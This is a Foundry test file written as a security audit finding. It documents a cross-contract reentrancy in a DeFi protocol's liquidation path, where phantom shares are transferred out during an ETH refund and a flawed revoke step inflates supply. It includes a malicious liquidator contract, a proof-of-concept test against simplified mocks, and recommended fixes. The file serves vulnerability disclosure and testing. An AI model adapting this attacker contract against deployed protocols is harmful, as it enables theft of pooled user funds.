// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// =============================================================================
// VULNERABILITY ANALYSIS
// =============================================================================
//
// Title   : Cross-Contract Reentrancy in Liquidation Enables Conversion of
//           Phantom Shares to Real Shares
// Severity: High
// Target  : CollateralTracker.settleLiquidation() and PanopticPool._liquidate()
//
// -----------------------------------------------------------------------------
// BACKGROUND
// -----------------------------------------------------------------------------
// During liquidation, PanopticPool._liquidate() burns positions and settles
// the liquidator. Phantom shares (amount = 2^248 - 1) are delegated to the
// liquidatee to represent the collateral being liquidated.
//
// -----------------------------------------------------------------------------
// ROOT CAUSE
// -----------------------------------------------------------------------------
// The vulnerability stems from three interacting behaviors:
//
// 1. Inconsistent Revocation Timing:
//    PanopticPool._liquidate delegates phantom shares to liquidatee on BOTH
//    collateral trackers simultaneously, but revokes them SEQUENTIALLY.
//
// 2. Unsafe External Call:
//    CollateralTracker.settleLiquidation performs an external ETH refund call
//    BEFORE the liquidation process is complete for the other token.
//
// 3. Accounting Flaw:
//    The revoke logic assumes missing phantom shares were "consumed" and
//    compensates by increasing _internalSupply. It doesn't account for the
//    possibility that phantom shares were transferred away.
//
// Vulnerable code path:
//
//   _liquidate() {
//     ct0.delegate(liquidatee, PHANTOM_SHARES);
//     ct1.delegate(liquidatee, PHANTOM_SHARES);  // both tokens delegated
//     ...
//     ct0.settleLiquidation{value: 1 wei}(...);  // EXTERNAL CALL - reentrancy window
//       -> safeTransferETH(liquidator, 1 wei);    // control passed to attacker
//       -> attacker calls ct1.transferFrom(liquidatee, attacker, PHANTOM_SHARES);
//     ct1.settleLiquidation(...);  // When called, liquidatee balance is 0
//       -> revoke(liquidatee);     // assumes shares were burned, increases _internalSupply
//   }
//
// -----------------------------------------------------------------------------
// IMPACT
// -----------------------------------------------------------------------------
// A malicious liquidator can steal "phantom shares" (virtual liquidity used for
// solvency checks) and convert them into real, redeemable shares. This results
// in complete drainage of assets from the CollateralTracker.
//
// -----------------------------------------------------------------------------
// PROOF-OF-CONCEPT SCENARIO
// -----------------------------------------------------------------------------
// 1. Set up a pool with liquidity in token1
// 2. Create a malicious liquidator contract
// 3. Trigger liquidation with msg.value = 1 wei to force the ETH refund path
// 4. In the receive() fallback, liquidator transfers ct1 phantom shares
//    from liquidatee to itself
// 5. After liquidation completes, liquidator holds valid shares and redeems
//
// -----------------------------------------------------------------------------
// RECOMMENDED FIX
// -----------------------------------------------------------------------------
// Option 1: Add nonReentrant modifier to settleLiquidation
// Option 2: Restrict phantom share transfers in transferFrom
// Option 3: Move ETH refund to end of _liquidate (after all settlements)
//
// Run PoC:
//   forge test --match-test testPoCH02_LiquidationReentrancy -vvv
// =============================================================================

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Mock CollateralTracker demonstrating the vulnerable pattern
contract MockCollateralTracker {
    mapping(address => uint256) public balanceOf;
    uint256 public internalSupply;
    bool public transferBlocked;

    // Phantom share amount
    uint256 constant PHANTOM_SHARES = type(uint248).max;

    function delegate(address delegatee) external {
        balanceOf[delegatee] = PHANTOM_SHARES;
    }

    // This is the vulnerable revoke logic - assumes missing shares were burned
    function revoke(address delegatee) external {
        uint256 currentBalance = balanceOf[delegatee];
        if (currentBalance < PHANTOM_SHARES) {
            // Accounting flaw: assumes missing shares were "consumed", compensates by increasing supply
            internalSupply += PHANTOM_SHARES - currentBalance;
        }
        balanceOf[delegatee] = 0;
    }

    // Transfer doesn't check for phantom shares during liquidation
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(!transferBlocked, "transfers blocked");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address owner, uint256 shares) external {
        balanceOf[owner] += shares;
        internalSupply += shares;
    }

    function setTransferBlocked(bool blocked) external {
        transferBlocked = blocked;
    }
}

// Malicious liquidator contract that exploits reentrancy
contract ReentrantLiquidator {
    MockCollateralTracker public ct0;
    MockCollateralTracker public ct1;
    address public liquidatee;
    bool public attackLaunched;

    constructor(address _ct0, address _ct1, address _liquidatee) {
        ct0 = MockCollateralTracker(_ct0);
        ct1 = MockCollateralTracker(_ct1);
        liquidatee = _liquidatee;
    }

    // Called during the vulnerable ETH refund path
    receive() external payable {
        if (!attackLaunched && msg.value > 0) {
            attackLaunched = true;
            // During reentrancy window, transfer phantom shares from liquidatee
            uint256 liquidateeBalance = ct1.balanceOf(liquidatee);
            if (liquidateeBalance > 0) {
                ct1.transferFrom(liquidatee, address(this), liquidateeBalance);
            }
        }
    }
}

contract PoCH02LiquidationReentrancyTest is Test {
    MockCollateralTracker public ct0;
    MockCollateralTracker public ct1;
    ReentrantLiquidator public attacker;

    address public constant VAULT = address(0x1);
    address public constant LIQUIDATEE = address(0x3);

    function setUp() public {
        ct0 = new MockCollateralTracker();
        ct1 = new MockCollateralTracker();

        // Fund ct1 with real shares
        ct1.mint(VAULT, 10000e18);

        attacker = new ReentrantLiquidator(address(ct0), address(ct1), LIQUIDATEE);

        console.log("Setup complete:");
        console.log("CT0 address:", address(ct0));
        console.log("CT1 address:", address(ct1));
        console.log("Attacker address:", address(attacker));
    }

    // -------------------------------------------------------------------------
    // PoC: Demonstrate the reentrancy vulnerability in liquidation
    // -------------------------------------------------------------------------
    //
    // Expected result on UNPATCHED code : PASS (phantom shares stolen)
    // Expected result after the fix     : FAIL (transfer blocked or guard)
    function testPoCH02_LiquidationReentrancy() public {
        console.log("=== H-02: Liquidation Reentrancy PoC ===");

        // Step 1: Delegate phantom shares to liquidatee on both trackers
        ct0.delegate(LIQUIDATEE);
        ct1.delegate(LIQUIDATEE);

        console.log("Phantom shares delegated to liquidatee");
        console.log("CT1 liquidatee balance:", ct1.balanceOf(LIQUIDATEE));

        // Step 2: Record initial state
        uint256 ct1InternalSupplyBefore = ct1.internalSupply();
        uint256 attackerBalanceBefore = ct1.balanceOf(address(attacker));
        console.log("CT1 internal supply before:", ct1InternalSupplyBefore);
        console.log("Attacker CT1 balance before:", attackerBalanceBefore);

        // Step 3: Fund attacker and trigger attack via ETH sending
        // This simulates the vulnerable flow where ETH refund happens BEFORE revocation
        vm.deal(address(attacker), 1 ether);
        (bool success, ) = address(attacker).call{value: 1 wei}("");
        require(success, "ETH transfer failed");

        console.log("After reentrancy attack:");
        console.log("Attack launched:", attacker.attackLaunched());
        console.log("Attacker CT1 balance after:", ct1.balanceOf(address(attacker)));
        console.log("Liquidatee CT1 balance after:", ct1.balanceOf(LIQUIDATEE));

        // Step 4: Simulate what happens when ct1.revoke is called
        // The revoke logic sees balance is 0 and incorrectly compensates
        ct1.revoke(LIQUIDATEE);

        uint256 ct1InternalSupplyAfter = ct1.internalSupply();
        console.log("CT1 internal supply after revoke:", ct1InternalSupplyAfter);

        // Key vulnerability: internalSupply was increased because revoke assumed
        // the missing shares were "burned" when they were actually transferred

        uint256 attackerFinalBalance = ct1.balanceOf(address(attacker));
        console.log("Attacker final CT1 balance:", attackerFinalBalance);

        // Verify the attack worked
        assertGt(attackerFinalBalance, 0, "Attacker should have phantom shares");
        assertGt(ct1InternalSupplyAfter, ct1InternalSupplyBefore, "Internal supply should increase");

        console.log(">>> PoC PASSED: Attacker obtained phantom shares via reentrancy");
        console.log("    These shares can be redeemed for real assets from CT1");
    }

    // -------------------------------------------------------------------------
    // Control: Normal revoke without reentrancy works correctly
    // -------------------------------------------------------------------------
    function testControl_NormalRevokeWithoutTransfer() public {
        console.log("=== Control: Normal revoke without transfer ===");

        ct1.delegate(LIQUIDATEE);

        uint256 internalSupplyBefore = ct1.internalSupply();
        uint256 liquidateeBalanceBefore = ct1.balanceOf(LIQUIDATEE);

        console.log("Internal supply before:", internalSupplyBefore);
        console.log("Liquidatee balance before:", liquidateeBalanceBefore);

        // Revoke without any transfer happening
        ct1.revoke(LIQUIDATEE);

        uint256 internalSupplyAfter = ct1.internalSupply();
        uint256 liquidateeBalanceAfter = ct1.balanceOf(LIQUIDATEE);

        console.log("Internal supply after:", internalSupplyAfter);
        console.log("Liquidatee balance after:", liquidateeBalanceAfter);

        // Normal flow: internal supply should NOT increase
        assertEq(internalSupplyAfter, internalSupplyBefore, "Internal supply should not change");
        console.log("Control test passed: normal revoke works correctly");
    }
}
